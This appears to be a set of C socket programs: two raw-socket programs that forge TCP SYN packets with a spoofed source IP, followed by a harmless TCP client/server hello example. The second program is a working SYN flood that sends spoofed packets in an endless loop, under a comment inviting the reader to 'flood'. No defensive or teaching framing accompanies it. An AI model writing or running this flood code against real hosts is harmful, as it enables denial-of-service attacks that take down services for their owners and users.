```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>    // For IP header
#include <netinet/tcp.h>   // For TCP header
#include <unistd.h>
 
// Pseudo header needed for TCP checksum calculation
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t tcp_length;
};
 
// Function to calculate checksum
unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;
 
    for (; len > 1; len -= 2)
        sum += *buf++;
    if (len == 1)
        sum += *(unsigned char *)buf;
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}
 
int main() {
    int sock;
    struct sockaddr_in dest;
    char packet[4096]; // Buffer for the packet
    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    struct pseudo_header psh;
 
    // Create raw socket
    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket creation failed");
        return 1;
    }
 
    // Set the socket option to include the IP header
    int optval = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &optval, sizeof(optval)) < 0) {
        perror("Failed to set socket option IP_HDRINCL");
        close(sock);
        return 1;
    }
 
    // Destination address
    dest.sin_family = AF_INET;
    dest.sin_port = htons(80); // Target port
    dest.sin_addr.s_addr = inet_addr("192.168.1.2"); // Replace with target IP
 
    memset(packet, 0, 4096); // Clear the buffer
 
    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = htonl(54321); // ID of this packet
    iph->frag_off = 0;
    iph->ttl = 64; // Common TTL value
    iph->protocol = IPPROTO_TCP;
    iph->check = 0; // Set to 0 before calculating checksum
    iph->saddr = inet_addr("192.168.1.100"); // Spoofed source IP
    iph->daddr = dest.sin_addr.s_addr;
 
    iph->check = checksum((unsigned short *)packet, sizeof(struct iphdr));
 
    // Fill in the TCP Header
    tcph->source = htons(1234); // Spoofed source port
    tcph->dest = htons(80); // Target port
    tcph->seq = htonl(0); // Initial sequence number
    tcph->ack_seq = 0;
    tcph->doff = 5; // TCP header size
    tcph->fin = 0;
    tcph->syn = 1; // SYN flag
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); // Maximum allowed window size
    tcph->check = 0; // Leave checksum 0 now
    tcph->urg_ptr = 0;
 
    // Pseudo header for checksum calculation
    psh.source_address = inet_addr("192.168.1.100");
    psh.dest_address = dest.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr));
 
    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr);
    char *pseudogram = calloc(1, psize); // Allocate and zero out memory
 
    memcpy(pseudogram, (char *)&psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
 
    tcph->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram); // Free allocated memory
 
    // Send the packet
    if (sendto(sock, packet, ntohs(iph->tot_len), 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
        perror("Send failed");
    } else {
        printf("Packet sent successfully\n");
    }
 
    close(sock);
    return 0;
}


```

```
#include <stdio.h>
#include <string.h>  // memset
#include <sys/socket.h>
#include <stdlib.h>  // exit(0)
#include <errno.h>   // For errno - the error number
#include <netinet/tcp.h>  // Provides declarations for tcp header
#include <netinet/ip.h>   // Provides declarations for ip header
#include <arpa/inet.h>    // For inet_addr and other socket operations
 
struct pseudo_header {
    unsigned int source_address;
    unsigned int dest_address;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
    struct tcphdr tcp;
};
 
// Checksum function
unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        oddbyte = *((unsigned char *)ptr);
        sum += oddbyte;
    }
 
    sum = (sum >> 16) + (sum & 0xffff);
    sum = sum + (sum >> 16);
    answer = (short) ~sum;
 
    return answer;
}
 
int main(void) {
    // Create a raw socket
    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("Socket creation failed");
        exit(1);  // Exit if socket creation fails
    }
 
    // Datagram to represent the packet
    char datagram[4096], source_ip[32];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
 
    strcpy(source_ip, "192.168.1.2");
 
    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr("172.19.125.122");
 
    memset(datagram, 0, 4096); /* zero out the buffer */
 
    // Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->id = htons(54321);  // ID of this packet
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;  // Set to 0 before calculating checksum
    iph->saddr = inet_addr(source_ip);  // Spoof the source IP address
    iph->daddr = sin.sin_addr.s_addr;
 
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
 
    // Fill in the TCP Header
    tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;  /* first and only TCP segment */
    tcph->fin = 0;
    tcph->syn = 1;
    tcph->rst = 0;
    tcph->psh = 0;
    tcph->ack = 0;
    tcph->urg = 0;
    tcph->window = htons(5840); /* maximum allowed window size */
    tcph->check = 0;  // If you set a checksum to zero, the kernel's IP stack
                      // should fill in the correct checksum during transmission
    tcph->urg_ptr = 0;
 
    // Now the IP checksum
    psh.source_address = inet_addr(source_ip);
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(20);
 
    memcpy(&psh.tcp, tcph, sizeof(struct tcphdr));
 
    tcph->check = csum((unsigned short *) &psh, sizeof(struct pseudo_header));
 
    // IP_HDRINCL to tell the kernel that headers are included in the packet
    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        printf("Error setting IP_HDRINCL. Error number : %d . Error message : %s\n", errno, strerror(errno));
        exit(0);
    }
 
    // Uncomment the loop if you want to flood :)
    while (1) {
        // Send the packet
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            printf("Error sending packet\n");
        } else {
            printf("Packet sent\n");
        }
    }
 
    return 0;
}


```

```
SERVER
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 12345

int main() {
    int server_socket, client_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[1024];
    char *message = "Hello from server!";

    // Step 1: Create the server socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (server_socket < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Prepare the server address struct
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;  // Listen on all network interfaces
    server_addr.sin_port = htons(PORT);  // Convert port to network byte order

    // Step 3: Bind the server socket to an IP address and port
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Bind failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    // Step 4: Listen for incoming connections
    if (listen(server_socket, 5) < 0) {
        perror("Listen failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("Server listening on port %d...\n", PORT);

    // Step 5: Accept a client connection
    client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &client_len);
    if (client_socket < 0) {
        perror("Client connection failed");
        close(server_socket);
        exit(EXIT_FAILURE);
    }

    printf("Client connected\n");

    // Step 6: Receive data from the client
    int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received < 0) {
        perror("Receive failed");
        close(client_socket);
        close(server_socket);
        exit(EXIT_FAILURE);
    }
    buffer[bytes_received] = '\0';  // Null-terminate the string
    printf("Received from client: %s\n", buffer);

    // Step 7: Send a response to the client
    send(client_socket, message, strlen(message), 0);

    // Step 8: Close the sockets
    close(client_socket);
    close(server_socket);

    return 0;
}

CLIENT
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 12345

int main() {
    int client_socket;
    struct sockaddr_in server_addr;
    char buffer[1024];
    char *message = "Hello from client!";

    // Step 1: Create the client socket
    client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Step 2: Prepare the server address struct
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(PORT);  // Convert port to network byte order

    // Replace "127.0.0.1" with the server's IP address if not testing locally
    if (inet_pton(AF_INET, "127.0.0.1", &server_addr.sin_addr) <= 0) {
        perror("Invalid server address");
        close(client_socket);
        exit(EXIT_FAILURE);
    }

    // Step 3: Connect to the server
    if (connect(client_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(client_socket);
        exit(EXIT_FAILURE);
    }

    // Step 4: Send data to the server
    send(client_socket, message, strlen(message), 0);

    // Step 5: Receive a response from the server
    int bytes_received = recv(client_socket, buffer, sizeof(buffer) - 1, 0);
    if (bytes_received < 0) {
        perror("Receive failed");
        close(client_socket);
        exit(EXIT_FAILURE);
    }
    buffer[bytes_received] = '\0';  // Null-terminate the string
    printf("Received from server: %s\n", buffer);

    // Step 6: Close the socket
    close(client_socket);

    return 0;
}
```

```

```